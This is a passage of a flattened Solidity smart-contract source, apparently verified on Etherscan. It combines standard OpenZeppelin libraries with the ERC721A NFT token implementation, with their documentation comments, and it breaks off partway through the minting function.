1 /**
2  *Submitted for verification at Etherscan.io on 2022-05-27
3 */
4 
5 // Sources flattened with hardhat v2.8.4 https://hardhat.org
6 
7 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
8 
9 // SPDX-License-Identifier: MIT
10 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
11 
12 pragma solidity ^0.8.4;
13 
14 /**
15  * @dev Provides information about the current execution context, including the
16  * sender of the transaction and its data. While these are generally available
17  * via msg.sender and msg.data, they should not be accessed in such a direct
18  * manner, since when dealing with meta-transactions the account sending and
19  * paying for execution may not be the actual sender (as far as an application
20  * is concerned).
21  *
22  * This contract is only required for intermediate, library-like contracts.
23  */
24 abstract contract Context {
25     function _msgSender() internal view virtual returns (address) {
26         return msg.sender;
27     }
28 
29     function _msgData() internal view virtual returns (bytes calldata) {
30         return msg.data;
31     }
32 }
33 
34 
35 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
36 
37 
38 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
39 
40 
41 
42 /**
43  * @dev Contract module which provides a basic access control mechanism, where
44  * there is an account (an owner) that can be granted exclusive access to
45  * specific functions.
46  *
47  * By default, the owner account will be the one that deploys the contract. This
48  * can later be changed with {transferOwnership}.
49  *
50  * This module is used through inheritance. It will make available the modifier
51  * `onlyOwner`, which can be applied to your functions to restrict their use to
52  * the owner.
53  */
54 abstract contract Ownable is Context {
55     address private _owner;
56 
57     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
58 
59     /**
60      * @dev Initializes the contract setting the deployer as the initial owner.
61      */
62     constructor() {
63         _transferOwnership(_msgSender());
64     }
65 
66     /**
67      * @dev Returns the address of the current owner.
68      */
69     function owner() public view virtual returns (address) {
70         return _owner;
71     }
72 
73     /**
74      * @dev Throws if called by any account other than the owner.
75      */
76     modifier onlyOwner() {
77         require(owner() == _msgSender(), "Ownable: caller is not the owner");
78         _;
79     }
80 
81     /**
82      * @dev Leaves the contract without owner. It will not be possible to call
83      * `onlyOwner` functions anymore. Can only be called by the current owner.
84      *
85      * NOTE: Renouncing ownership will leave the contract without an owner,
86      * thereby removing any functionality that is only available to the owner.
87      */
88     function renounceOwnership() public virtual onlyOwner {
89         _transferOwnership(address(0));
90     }
91 
92     /**
93      * @dev Transfers ownership of the contract to a new account (`newOwner`).
94      * Can only be called by the current owner.
95      */
96     function transferOwnership(address newOwner) public virtual onlyOwner {
97         require(newOwner != address(0), "Ownable: new owner is the zero address");
98         _transferOwnership(newOwner);
99     }
100 
101     /**
102      * @dev Transfers ownership of the contract to a new account (`newOwner`).
103      * Internal function without access restriction.
104      */
105     function _transferOwnership(address newOwner) internal virtual {
106         address oldOwner = _owner;
107         _owner = newOwner;
108         emit OwnershipTransferred(oldOwner, newOwner);
109     }
110 }
111 
112 
113 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
114 
115 
116 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
117 
118 
119 
120 /**
121  * @dev Interface of the ERC165 standard, as defined in the
122  * https://eips.ethereum.org/EIPS/eip-165[EIP].
123  *
124  * Implementers can declare support of contract interfaces, which can then be
125  * queried by others ({ERC165Checker}).
126  *
127  * For an implementation, see {ERC165}.
128  */
129 interface IERC165 {
130     /**
131      * @dev Returns true if this contract implements the interface defined by
132      * `interfaceId`. See the corresponding
133      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
134      * to learn more about how these ids are created.
135      *
136      * This function call must use less than 30 000 gas.
137      */
138     function supportsInterface(bytes4 interfaceId) external view returns (bool);
139 }
140 
141 
142 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
143 
144 
145 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
146 
147 
148 
149 /**
150  * @dev Required interface of an ERC721 compliant contract.
151  */
152 interface IERC721 is IERC165 {
153     /**
154      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
155      */
156     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
157 
158     /**
159      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
160      */
161     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
162 
163     /**
164      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
165      */
166     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
167 
168     /**
169      * @dev Returns the number of tokens in ``owner``'s account.
170      */
171     function balanceOf(address owner) external view returns (uint256 balance);
172 
173     /**
174      * @dev Returns the owner of the `tokenId` token.
175      *
176      * Requirements:
177      *
178      * - `tokenId` must exist.
179      */
180     function ownerOf(uint256 tokenId) external view returns (address owner);
181 
182     /**
183      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
184      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
185      *
186      * Requirements:
187      *
188      * - `from` cannot be the zero address.
189      * - `to` cannot be the zero address.
190      * - `tokenId` token must exist and be owned by `from`.
191      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
192      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
193      *
194      * Emits a {Transfer} event.
195      */
196     function safeTransferFrom(
197         address from,
198         address to,
199         uint256 tokenId
200     ) external;
201 
202     /**
203      * @dev Transfers `tokenId` token from `from` to `to`.
204      *
205      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
206      *
207      * Requirements:
208      *
209      * - `from` cannot be the zero address.
210      * - `to` cannot be the zero address.
211      * - `tokenId` token must be owned by `from`.
212      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
213      *
214      * Emits a {Transfer} event.
215      */
216     function transferFrom(
217         address from,
218         address to,
219         uint256 tokenId
220     ) external;
221 
222     /**
223      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
224      * The approval is cleared when the token is transferred.
225      *
226      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
227      *
228      * Requirements:
229      *
230      * - The caller must own the token or be an approved operator.
231      * - `tokenId` must exist.
232      *
233      * Emits an {Approval} event.
234      */
235     function approve(address to, uint256 tokenId) external;
236 
237     /**
238      * @dev Returns the account approved for `tokenId` token.
239      *
240      * Requirements:
241      *
242      * - `tokenId` must exist.
243      */
244     function getApproved(uint256 tokenId) external view returns (address operator);
245 
246     /**
247      * @dev Approve or remove `operator` as an operator for the caller.
248      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
249      *
250      * Requirements:
251      *
252      * - The `operator` cannot be the caller.
253      *
254      * Emits an {ApprovalForAll} event.
255      */
256     function setApprovalForAll(address operator, bool _approved) external;
257 
258     /**
259      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
260      *
261      * See {setApprovalForAll}
262      */
263     function isApprovedForAll(address owner, address operator) external view returns (bool);
264 
265     /**
266      * @dev Safely transfers `tokenId` token from `from` to `to`.
267      *
268      * Requirements:
269      *
270      * - `from` cannot be the zero address.
271      * - `to` cannot be the zero address.
272      * - `tokenId` token must exist and be owned by `from`.
273      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
274      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
275      *
276      * Emits a {Transfer} event.
277      */
278     function safeTransferFrom(
279         address from,
280         address to,
281         uint256 tokenId,
282         bytes calldata data
283     ) external;
284 }
285 
286 
287 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
288 
289 
290 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
291 
292 
293 
294 /**
295  * @title ERC721 token receiver interface
296  * @dev Interface for any contract that wants to support safeTransfers
297  * from ERC721 asset contracts.
298  */
299 interface IERC721Receiver {
300     /**
301      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
302      * by `operator` from `from`, this function is called.
303      *
304      * It must return its Solidity selector to confirm the token transfer.
305      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
306      *
307      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
308      */
309     function onERC721Received(
310         address operator,
311         address from,
312         uint256 tokenId,
313         bytes calldata data
314     ) external returns (bytes4);
315 }
316 
317 
318 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
319 
320 
321 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
322 
323 
324 
325 /**
326  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
327  * @dev See https://eips.ethereum.org/EIPS/eip-721
328  */
329 interface IERC721Metadata is IERC721 {
330     /**
331      * @dev Returns the token collection name.
332      */
333     function name() external view returns (string memory);
334 
335     /**
336      * @dev Returns the token collection symbol.
337      */
338     function symbol() external view returns (string memory);
339 
340     /**
341      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
342      */
343     function tokenURI(uint256 tokenId) external view returns (string memory);
344 }
345 
346 
347 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
348 
349 
350 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
351 
352 
353 
354 /**
355  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
356  * @dev See https://eips.ethereum.org/EIPS/eip-721
357  */
358 interface IERC721Enumerable is IERC721 {
359     /**
360      * @dev Returns the total amount of tokens stored by the contract.
361      */
362     function totalSupply() external view returns (uint256);
363 
364     /**
365      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
366      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
367      */
368     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
369 
370     /**
371      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
372      * Use along with {totalSupply} to enumerate all tokens.
373      */
374     function tokenByIndex(uint256 index) external view returns (uint256);
375 }
376 
377 
378 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
379 
380 
381 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
382 
383 pragma solidity ^0.8.1;
384 
385 /**
386  * @dev Collection of functions related to the address type
387  */
388 library Address {
389     /**
390      * @dev Returns true if `account` is a contract.
391      *
392      * [IMPORTANT]
393      * ====
394      * It is unsafe to assume that an address for which this function returns
395      * false is an externally-owned account (EOA) and not a contract.
396      *
397      * Among others, `isContract` will return false for the following
398      * types of addresses:
399      *
400      *  - an externally-owned account
401      *  - a contract in construction
402      *  - an address where a contract will be created
403      *  - an address where a contract lived, but was destroyed
404      * ====
405      *
406      * [IMPORTANT]
407      * ====
408      * You shouldn't rely on `isContract` to protect against flash loan attacks!
409      *
410      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
411      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
412      * constructor.
413      * ====
414      */
415     function isContract(address account) internal view returns (bool) {
416         // This method relies on extcodesize/address.code.length, which returns 0
417         // for contracts in construction, since the code is only stored at the end
418         // of the constructor execution.
419 
420         return account.code.length > 0;
421     }
422 
423     /**
424      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
425      * `recipient`, forwarding all available gas and reverting on errors.
426      *
427      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
428      * of certain opcodes, possibly making contracts go over the 2300 gas limit
429      * imposed by `transfer`, making them unable to receive funds via
430      * `transfer`. {sendValue} removes this limitation.
431      *
432      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
433      *
434      * IMPORTANT: because control is transferred to `recipient`, care must be
435      * taken to not create reentrancy vulnerabilities. Consider using
436      * {ReentrancyGuard} or the
437      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
438      */
439     function sendValue(address payable recipient, uint256 amount) internal {
440         require(address(this).balance >= amount, "Address: insufficient balance");
441 
442         (bool success, ) = recipient.call{value: amount}("");
443         require(success, "Address: unable to send value, recipient may have reverted");
444     }
445 
446     /**
447      * @dev Performs a Solidity function call using a low level `call`. A
448      * plain `call` is an unsafe replacement for a function call: use this
449      * function instead.
450      *
451      * If `target` reverts with a revert reason, it is bubbled up by this
452      * function (like regular Solidity function calls).
453      *
454      * Returns the raw returned data. To convert to the expected return value,
455      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
456      *
457      * Requirements:
458      *
459      * - `target` must be a contract.
460      * - calling `target` with `data` must not revert.
461      *
462      * _Available since v3.1._
463      */
464     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
465         return functionCall(target, data, "Address: low-level call failed");
466     }
467 
468     /**
469      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
470      * `errorMessage` as a fallback revert reason when `target` reverts.
471      *
472      * _Available since v3.1._
473      */
474     function functionCall(
475         address target,
476         bytes memory data,
477         string memory errorMessage
478     ) internal returns (bytes memory) {
479         return functionCallWithValue(target, data, 0, errorMessage);
480     }
481 
482     /**
483      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
484      * but also transferring `value` wei to `target`.
485      *
486      * Requirements:
487      *
488      * - the calling contract must have an ETH balance of at least `value`.
489      * - the called Solidity function must be `payable`.
490      *
491      * _Available since v3.1._
492      */
493     function functionCallWithValue(
494         address target,
495         bytes memory data,
496         uint256 value
497     ) internal returns (bytes memory) {
498         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
499     }
500 
501     /**
502      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
503      * with `errorMessage` as a fallback revert reason when `target` reverts.
504      *
505      * _Available since v3.1._
506      */
507     function functionCallWithValue(
508         address target,
509         bytes memory data,
510         uint256 value,
511         string memory errorMessage
512     ) internal returns (bytes memory) {
513         require(address(this).balance >= value, "Address: insufficient balance for call");
514         require(isContract(target), "Address: call to non-contract");
515 
516         (bool success, bytes memory returndata) = target.call{value: value}(data);
517         return verifyCallResult(success, returndata, errorMessage);
518     }
519 
520     /**
521      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
522      * but performing a static call.
523      *
524      * _Available since v3.3._
525      */
526     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
527         return functionStaticCall(target, data, "Address: low-level static call failed");
528     }
529 
530     /**
531      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
532      * but performing a static call.
533      *
534      * _Available since v3.3._
535      */
536     function functionStaticCall(
537         address target,
538         bytes memory data,
539         string memory errorMessage
540     ) internal view returns (bytes memory) {
541         require(isContract(target), "Address: static call to non-contract");
542 
543         (bool success, bytes memory returndata) = target.staticcall(data);
544         return verifyCallResult(success, returndata, errorMessage);
545     }
546 
547     /**
548      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
549      * but performing a delegate call.
550      *
551      * _Available since v3.4._
552      */
553     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
554         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
555     }
556 
557     /**
558      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
559      * but performing a delegate call.
560      *
561      * _Available since v3.4._
562      */
563     function functionDelegateCall(
564         address target,
565         bytes memory data,
566         string memory errorMessage
567     ) internal returns (bytes memory) {
568         require(isContract(target), "Address: delegate call to non-contract");
569 
570         (bool success, bytes memory returndata) = target.delegatecall(data);
571         return verifyCallResult(success, returndata, errorMessage);
572     }
573 
574     /**
575      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
576      * revert reason using the provided one.
577      *
578      * _Available since v4.3._
579      */
580     function verifyCallResult(
581         bool success,
582         bytes memory returndata,
583         string memory errorMessage
584     ) internal pure returns (bytes memory) {
585         if (success) {
586             return returndata;
587         } else {
588             // Look for revert reason and bubble it up if present
589             if (returndata.length > 0) {
590                 // The easiest way to bubble the revert reason is using memory via assembly
591 
592                 assembly {
593                     let returndata_size := mload(returndata)
594                     revert(add(32, returndata), returndata_size)
595                 }
596             } else {
597                 revert(errorMessage);
598             }
599         }
600     }
601 }
602 
603 
604 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
605 
606 
607 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
608 
609 
610 
611 /**
612  * @dev String operations.
613  */
614 library Strings {
615     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
616 
617     /**
618      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
619      */
620     function toString(uint256 value) internal pure returns (string memory) {
621         // Inspired by OraclizeAPI's implementation - MIT licence
622         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
623 
624         if (value == 0) {
625             return "0";
626         }
627         uint256 temp = value;
628         uint256 digits;
629         while (temp != 0) {
630             digits++;
631             temp /= 10;
632         }
633         bytes memory buffer = new bytes(digits);
634         while (value != 0) {
635             digits -= 1;
636             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
637             value /= 10;
638         }
639         return string(buffer);
640     }
641 
642     /**
643      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
644      */
645     function toHexString(uint256 value) internal pure returns (string memory) {
646         if (value == 0) {
647             return "0x00";
648         }
649         uint256 temp = value;
650         uint256 length = 0;
651         while (temp != 0) {
652             length++;
653             temp >>= 8;
654         }
655         return toHexString(value, length);
656     }
657 
658     /**
659      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
660      */
661     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
662         bytes memory buffer = new bytes(2 * length + 2);
663         buffer[0] = "0";
664         buffer[1] = "x";
665         for (uint256 i = 2 * length + 1; i > 1; --i) {
666             buffer[i] = _HEX_SYMBOLS[value & 0xf];
667             value >>= 4;
668         }
669         require(value == 0, "Strings: hex length insufficient");
670         return string(buffer);
671     }
672 }
673 
674 
675 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
676 
677 
678 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
679 
680 
681 
682 /**
683  * @dev Implementation of the {IERC165} interface.
684  *
685  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
686  * for the additional interface id that will be supported. For example:
687  *
688  * ```solidity
689  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
690  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
691  * }
692  * ```
693  *
694  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
695  */
696 abstract contract ERC165 is IERC165 {
697     /**
698      * @dev See {IERC165-supportsInterface}.
699      */
700     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
701         return interfaceId == type(IERC165).interfaceId;
702     }
703 }
704 
705 
706 // File erc721a/contracts/ERC721A.sol@v3.0.0
707 
708 
709 // Creator: Chiru Labs
710 
711 error ApprovalCallerNotOwnerNorApproved();
712 error ApprovalQueryForNonexistentToken();
713 error ApproveToCaller();
714 error ApprovalToCurrentOwner();
715 error BalanceQueryForZeroAddress();
716 error MintedQueryForZeroAddress();
717 error BurnedQueryForZeroAddress();
718 error AuxQueryForZeroAddress();
719 error MintToZeroAddress();
720 error MintZeroQuantity();
721 error OwnerIndexOutOfBounds();
722 error OwnerQueryForNonexistentToken();
723 error TokenIndexOutOfBounds();
724 error TransferCallerNotOwnerNorApproved();
725 error TransferFromIncorrectOwner();
726 error TransferToNonERC721ReceiverImplementer();
727 error TransferToZeroAddress();
728 error URIQueryForNonexistentToken();
729 
730 /**
731  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
732  * the Metadata extension. Built to optimize for lower gas during batch mints.
733  *
734  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
735  *
736  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
737  *
738  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
739  */
740 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
741     using Address for address;
742     using Strings for uint256;
743 
744     // Compiler will pack this into a single 256bit word.
745     struct TokenOwnership {
746         // The address of the owner.
747         address addr;
748         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
749         uint64 startTimestamp;
750         // Whether the token has been burned.
751         bool burned;
752     }
753 
754     // Compiler will pack this into a single 256bit word.
755     struct AddressData {
756         // Realistically, 2**64-1 is more than enough.
757         uint64 balance;
758         // Keeps track of mint count with minimal overhead for tokenomics.
759         uint64 numberMinted;
760         // Keeps track of burn count with minimal overhead for tokenomics.
761         uint64 numberBurned;
762         // For miscellaneous variable(s) pertaining to the address
763         // (e.g. number of whitelist mint slots used).
764         // If there are multiple variables, please pack them into a uint64.
765         uint64 aux;
766     }
767 
768     // The tokenId of the next token to be minted.
769     uint256 internal _currentIndex;
770 
771     // The number of tokens burned.
772     uint256 internal _burnCounter;
773 
774     // Token name
775     string private _name;
776 
777     // Token symbol
778     string private _symbol;
779 
780     // Mapping from token ID to ownership details
781     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
782     mapping(uint256 => TokenOwnership) internal _ownerships;
783 
784     // Mapping owner address to address data
785     mapping(address => AddressData) private _addressData;
786 
787     // Mapping from token ID to approved address
788     mapping(uint256 => address) private _tokenApprovals;
789 
790     // Mapping from owner to operator approvals
791     mapping(address => mapping(address => bool)) private _operatorApprovals;
792 
793     constructor(string memory name_, string memory symbol_) {
794         _name = name_;
795         _symbol = symbol_;
796         _currentIndex = _startTokenId();
797     }
798 
799     /**
800      * To change the starting tokenId, please override this function.
801      */
802     function _startTokenId() internal view virtual returns (uint256) {
803         return 0;
804     }
805 
806     /**
807      * @dev See {IERC721Enumerable-totalSupply}.
808      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
809      */
810     function totalSupply() public view returns (uint256) {
811         // Counter underflow is impossible as _burnCounter cannot be incremented
812         // more than _currentIndex - _startTokenId() times
813         unchecked {
814             return _currentIndex - _burnCounter - _startTokenId();
815         }
816     }
817 
818     /**
819      * Returns the total amount of tokens minted in the contract.
820      */
821     function _totalMinted() internal view returns (uint256) {
822         // Counter underflow is impossible as _currentIndex does not decrement,
823         // and it is initialized to _startTokenId()
824         unchecked {
825             return _currentIndex - _startTokenId();
826         }
827     }
828 
829     /**
830      * @dev See {IERC165-supportsInterface}.
831      */
832     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
833         return
834             interfaceId == type(IERC721).interfaceId ||
835             interfaceId == type(IERC721Metadata).interfaceId ||
836             super.supportsInterface(interfaceId);
837     }
838 
839     /**
840      * @dev See {IERC721-balanceOf}.
841      */
842     function balanceOf(address owner) public view override returns (uint256) {
843         if (owner == address(0)) revert BalanceQueryForZeroAddress();
844         return uint256(_addressData[owner].balance);
845     }
846 
847     /**
848      * Returns the number of tokens minted by `owner`.
849      */
850     function _numberMinted(address owner) internal view returns (uint256) {
851         if (owner == address(0)) revert MintedQueryForZeroAddress();
852         return uint256(_addressData[owner].numberMinted);
853     }
854 
855     /**
856      * Returns the number of tokens burned by or on behalf of `owner`.
857      */
858     function _numberBurned(address owner) internal view returns (uint256) {
859         if (owner == address(0)) revert BurnedQueryForZeroAddress();
860         return uint256(_addressData[owner].numberBurned);
861     }
862 
863     /**
864      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
865      */
866     function _getAux(address owner) internal view returns (uint64) {
867         if (owner == address(0)) revert AuxQueryForZeroAddress();
868         return _addressData[owner].aux;
869     }
870 
871     /**
872      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
873      * If there are multiple variables, please pack them into a uint64.
874      */
875     function _setAux(address owner, uint64 aux) internal {
876         if (owner == address(0)) revert AuxQueryForZeroAddress();
877         _addressData[owner].aux = aux;
878     }
879 
880     /**
881      * Gas spent here starts off proportional to the maximum mint batch size.
882      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
883      */
884     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
885         uint256 curr = tokenId;
886 
887         unchecked {
888             if (_startTokenId() <= curr && curr < _currentIndex) {
889                 TokenOwnership memory ownership = _ownerships[curr];
890                 if (!ownership.burned) {
891                     if (ownership.addr != address(0)) {
892                         return ownership;
893                     }
894                     // Invariant:
895                     // There will always be an ownership that has an address and is not burned
896                     // before an ownership that does not have an address and is not burned.
897                     // Hence, curr will not underflow.
898                     while (true) {
899                         curr--;
900                         ownership = _ownerships[curr];
901                         if (ownership.addr != address(0)) {
902                             return ownership;
903                         }
904                     }
905                 }
906             }
907         }
908         revert OwnerQueryForNonexistentToken();
909     }
910 
911     /**
912      * @dev See {IERC721-ownerOf}.
913      */
914     function ownerOf(uint256 tokenId) public view override returns (address) {
915         return ownershipOf(tokenId).addr;
916     }
917 
918     /**
919      * @dev See {IERC721Metadata-name}.
920      */
921     function name() public view virtual override returns (string memory) {
922         return _name;
923     }
924 
925     /**
926      * @dev See {IERC721Metadata-symbol}.
927      */
928     function symbol() public view virtual override returns (string memory) {
929         return _symbol;
930     }
931 
932     /**
933      * @dev See {IERC721Metadata-tokenURI}.
934      */
935     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
936         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
937 
938         string memory baseURI = _baseURI();
939         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
940     }
941 
942     /**
943      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
944      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
945      * by default, can be overriden in child contracts.
946      */
947     function _baseURI() internal view virtual returns (string memory) {
948         return '';
949     }
950 
951     /**
952      * @dev See {IERC721-approve}.
953      */
954     function approve(address to, uint256 tokenId) public override {
955         address owner = ERC721A.ownerOf(tokenId);
956         if (to == owner) revert ApprovalToCurrentOwner();
957 
958         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
959             revert ApprovalCallerNotOwnerNorApproved();
960         }
961 
962         _approve(to, tokenId, owner);
963     }
964 
965     /**
966      * @dev See {IERC721-getApproved}.
967      */
968     function getApproved(uint256 tokenId) public view override returns (address) {
969         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
970 
971         return _tokenApprovals[tokenId];
972     }
973 
974     /**
975      * @dev See {IERC721-setApprovalForAll}.
976      */
977     function setApprovalForAll(address operator, bool approved) public override {
978         if (operator == _msgSender()) revert ApproveToCaller();
979 
980         _operatorApprovals[_msgSender()][operator] = approved;
981         emit ApprovalForAll(_msgSender(), operator, approved);
982     }
983 
984     /**
985      * @dev See {IERC721-isApprovedForAll}.
986      */
987     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
988         return _operatorApprovals[owner][operator];
989     }
990 
991     /**
992      * @dev See {IERC721-transferFrom}.
993      */
994     function transferFrom(
995         address from,
996         address to,
997         uint256 tokenId
998     ) public virtual override {
999         _transfer(from, to, tokenId);
1000     }
1001 
1002     /**
1003      * @dev See {IERC721-safeTransferFrom}.
1004      */
1005     function safeTransferFrom(
1006         address from,
1007         address to,
1008         uint256 tokenId
1009     ) public virtual override {
1010         safeTransferFrom(from, to, tokenId, '');
1011     }
1012 
1013     /**
1014      * @dev See {IERC721-safeTransferFrom}.
1015      */
1016     function safeTransferFrom(
1017         address from,
1018         address to,
1019         uint256 tokenId,
1020         bytes memory _data
1021     ) public virtual override {
1022         _transfer(from, to, tokenId);
1023         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1024             revert TransferToNonERC721ReceiverImplementer();
1025         }
1026     }
1027 
1028     /**
1029      * @dev Returns whether `tokenId` exists.
1030      *
1031      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1032      *
1033      * Tokens start existing when they are minted (`_mint`),
1034      */
1035     function _exists(uint256 tokenId) internal view returns (bool) {
1036         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1037             !_ownerships[tokenId].burned;
1038     }
1039 
1040     function _safeMint(address to, uint256 quantity) internal {
1041         _safeMint(to, quantity, '');
1042     }
1043 
1044     /**
1045      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1046      *
1047      * Requirements:
1048      *
1049      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1050      * - `quantity` must be greater than 0.
1051      *
1052      * Emits a {Transfer} event.
1053      */
1054     function _safeMint(
1055         address to,
1056         uint256 quantity,
1057         bytes memory _data
1058     ) internal {
1059         _mint(to, quantity, _data, true);
1060     }
1061 
1062     /**
1063      * @dev Mints `quantity` tokens and transfers them to `to`.
1064      *
1065      * Requirements:
1066      *
1067      * - `to` cannot be the zero address.
1068      * - `quantity` must be greater than 0.
1069      *
1070      * Emits a {Transfer} event.
1071      */
1072     function _mint(
1073         address to,
1074         uint256 quantity,
1075         bytes memory _data,
1076         bool safe
1077     ) internal {
1078         uint256 startTokenId = _currentIndex;
1079         if (to == address(0)) revert MintToZeroAddress();
1080         if (quantity == 0) revert MintZeroQuantity();
1081 
1082         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1083 
1084         // Overflows are incredibly unrealistic.
1085         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1086         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1087         unchecked {
1088             _addressData[to].balance += uint64(quantity);
1089             _addressData[to].numberMinted += uint64(quantity);
1090 
